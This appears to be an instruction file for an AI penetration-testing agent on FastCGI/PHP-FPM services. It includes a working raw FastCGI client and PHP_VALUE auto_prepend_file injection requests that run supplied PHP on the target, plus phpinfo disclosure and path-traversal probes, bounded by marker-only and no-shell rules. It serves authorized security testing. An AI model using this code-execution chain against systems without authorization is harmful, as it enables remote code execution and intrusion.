---
name: fastcgi-service-testing
description: Detect and safely test exposed FastCGI and PHP-FPM listeners for parameter injection and parsing flaws
origin: RedteamOpencode
---

# FastCGI / PHP-FPM Service Testing

## When to Activate

- An exposed port or proxy route reaches a FastCGI/PHP-FPM worker
- Client-controlled headers, paths, or values may become FPM parameters
- Code execution, read-only disclosure, or parser disagreement needs safe confirmation

## Tools

`run_tool nmap`, `run_tool curl`, `python3`, `awk`

## Methodology

### 1. Detect an Exposed FPM Listener

Run the required NSE check, then build one bounded FastCGI client under `$DIR/tools/`. A valid record header from `PING` or `GET_VALUES` confirms the protocol; save all captures under `$DIR/scans/`. # minimal confirmation

```bash
run_tool nmap -sV -p 9000,9090 --script fastcgi-enum HOST > "$DIR/scans/fastcgi_nmap.txt" 2>&1
python3 - "$DIR/tools/fastcgi_probe.py" <<'PY'
import argparse, socket, struct, sys
a = argparse.ArgumentParser()
a.add_argument("mode", choices=("ping", "get-values", "request")); a.add_argument("--host", required=True)
a.add_argument("--port", type=int, required=True); a.add_argument("--param", action="append", default=[], dest="params"); a.add_argument("--body", default="")
p = a.parse_args()
def rec(kind, ident, data=b""):
    return struct.pack("!BBHHBB", 1, kind, ident, len(data), 0, 0) + data
def pair(name, value):
    n, v = name.encode(), value.encode()
    return struct.pack("!BB", len(n) | 128, len(v) | 128) + n + v
params = b"".join(pair(*x.split("=", 1)) for x in p.params[:32])
out = rec(1, 1, struct.pack("!HB5x", 1, 0)) + rec(4, 1, params) + rec(4, 1) + rec(5, 1, p.body.encode())
if p.mode == "get-values": out += rec(9, 1)
with socket.create_connection((p.host, p.port), 5) as s:
    s.settimeout(5); s.sendall(out); data = bytearray()
    while len(data) < 131072:
        chunk = s.recv(min(65536, 131072 - len(data)))
        if not chunk: break
        data.extend(chunk)
sys.stdout.buffer.write(data)
PY
python3 "$DIR/tools/fastcgi_probe.py" ping --host HOST --port PORT > "$DIR/scans/fastcgi_ping.bin" 2>&1 # PING
python3 "$DIR/tools/fastcgi_probe.py" get-values --host HOST --port PORT > "$DIR/scans/fastcgi_get_values.bin" 2>&1 # GET_VALUES
```

### 2. Confirm Code Execution Safely

Use a pre-existing controlled marker page and whichever of `PHP_VALUE` or `PHP_ADMIN_VALUE` is exposed. Either set `display_errors=1|error_reporting=-1` and trigger its known harmless notice, or prepend a read-only marker with `auto_prepend_file=php://input`; require `MARKER`. Never spawn a shell, write a target file, set `extension`, or change pool configuration. # safe execution only

```bash
python3 "$DIR/tools/fastcgi_probe.py" request --host HOST --port PORT --param SCRIPT_FILENAME=/var/www/html/marker.php --param SCRIPT_NAME=/marker.php --param REQUEST_METHOD=GET --param 'PHP_VALUE=auto_prepend_file=php://input' --body '<?php echo "MARKER\n"; ?>' > "$DIR/scans/fastcgi_safe_exec.txt" 2>&1 # unique marker
```

### 3. Capture Read-Only Disclosure

Make one `phpinfo()` request through the accepted override. Restrict evidence to document root, SAPI, version, `disable_functions`, and `open_basedir`; treat the unfiltered response as sensitive. # one request

```bash
python3 "$DIR/tools/fastcgi_probe.py" request --host HOST --port PORT --param SCRIPT_FILENAME=/var/www/html/marker.php --param SCRIPT_NAME=/marker.php --param REQUEST_METHOD=GET --param 'PHP_VALUE=auto_prepend_file=php://input' --body '<?php echo "MARKER\n"; phpinfo(); ?>' > "$DIR/scans/fastcgi_phpinfo.txt" 2>&1 # disclosure
awk '{s=tolower($0)} s ~ /document root|server sapi|server api|php version|disable_functions|open_basedir/ {gsub(/<[^>]+>/," "); gsub(/[[:space:]]+/," "); print}' "$DIR/scans/fastcgi_phpinfo.txt" > "$DIR/scans/fastcgi_phpinfo_summary.txt"
```

### 4. Test Path-Info and Path Splitting

Send one encoded-dot probe, one `..%2f` probe, and one request whose front and FPM paths disagree. If a read appears, corroborate one operator-known non-sensitive config file and stop; never extract more. # one probe per variant

```bash
python3 "$DIR/tools/fastcgi_probe.py" request --host HOST --port PORT --param SCRIPT_FILENAME=/var/www/html/%2e%2e/html/marker.php --param SCRIPT_NAME=/marker.php --param REQUEST_URI=/marker.php/%2e%2e%2fmarker.php --param PATH_INFO=/%2e%2e%2fmarker.php > "$DIR/scans/fastcgi_path_encoded.txt" 2>&1 # encoded dots
python3 "$DIR/tools/fastcgi_probe.py" request --host HOST --port PORT --param SCRIPT_FILENAME=/var/www/html/..%2fhtml/marker.php --param SCRIPT_NAME=/marker.php --param REQUEST_URI=/marker.php/..%2fmarker.php --param PATH_INFO=/..%2fmarker.php > "$DIR/scans/fastcgi_path_split.txt" 2>&1 # encoded separator
python3 "$DIR/tools/fastcgi_probe.py" request --host HOST --port PORT --param SCRIPT_FILENAME=/var/www/html/marker.php --param SCRIPT_NAME=/frontend.php --param REQUEST_URI=/frontend.php/..%2fmarker.php --param PATH_INFO=/..%2fmarker.php > "$DIR/scans/fastcgi_path_disagree.txt" 2>&1 # front/FPM mismatch
```

### 5. Test Arbitrary PHP Inclusion

When path-info, suffix handling, or static-file routing is attacker-influenceable, test one or two known local PHP-bearing candidates; perform no upload. Require `MARKER` before claiming impact. # no upload

```bash
run_tool curl -sS -D - --path-as-is --connect-timeout 5 --max-time 20 "https://HOST/assets/marker.php%2f..%2f..%2fmarker.php" > "$DIR/scans/fastcgi_inclusion_path_info.txt" 2>&1 # path-info
run_tool curl -sS -D - --connect-timeout 5 --max-time 20 "https://HOST/static.php/marker.php" > "$DIR/scans/fastcgi_inclusion_suffix.txt" 2>&1 # suffix routing
```

### 6. Test Proxy-Side Exposure

Without a direct listener, send one probe per class against a route already known to negotiate HTTP/2: HTTP/1.1 downgrade, `Host` selection, and encoded normalization. Flag only a verified proxy-to-FPM transition, not a status code or theory. # no smuggling storm

```bash
run_tool curl -sS -D - --http1.1 --connect-timeout 5 --max-time 20 "https://HOST/fpm-status" > "$DIR/scans/fastcgi_proxy_downgrade.txt" 2>&1 # downgrade
run_tool curl -sS -D - -H 'Host: example.com' --connect-timeout 5 --max-time 20 "https://HOST/fpm-status" > "$DIR/scans/fastcgi_proxy_host.txt" 2>&1 # host selection
run_tool curl -sS -D - --path-as-is --connect-timeout 5 --max-time 20 "https://HOST/fpm/..%2fstatus" > "$DIR/scans/fastcgi_proxy_path.txt" 2>&1 # normalization
```

### 7. Assess Hardening

Check whether FPM uses a unix socket or localhost, is firewalled, runs unprivileged, restricts dangerous ini overrides, and is unreachable from proxy-controlled paths. Report each missing control directly, not as speculative RCE. # evidence-led

```bash
python3 - <<'PY' > "$DIR/scans/fastcgi_hardening.txt"
controls = ("unix socket or localhost", "firewall", "unprivileged worker", "restricted ini overrides", "no proxy-controlled backend path")
for control in controls: print(control)
PY
```

### 8. Enforce Safe-Test and Evidence Rules

Never execute a shell on the target, write target files, corrupt configuration, attempt crashes or DoS, or use unbounded loops. Before reporting, require a reproducible request/response pair, the exact injected parameter, and the unique impact marker. # hard stop

```bash
python3 - <<'PY'
print("request | response | exact injected parameter | unique marker")
PY
```

## References

`references/vuln-checklists/A02-security-misconfiguration.md`, `references/vuln-checklists/A05-injection.md`, `references/payloads/file-inclusion-payloads.md`, `references/payloads/directory-traversal-payloads.md`, `references/payloads/request-smuggling-payloads.md`.

## Confirm-Only Rule

Stop at the unique marker or one corroborated read; do not spawn a shell, write target files, alter non-FPM configuration, or escalate impact.

## Budget

Maximum 16 FPM-backed requests per host and 20 minutes wall-clock.
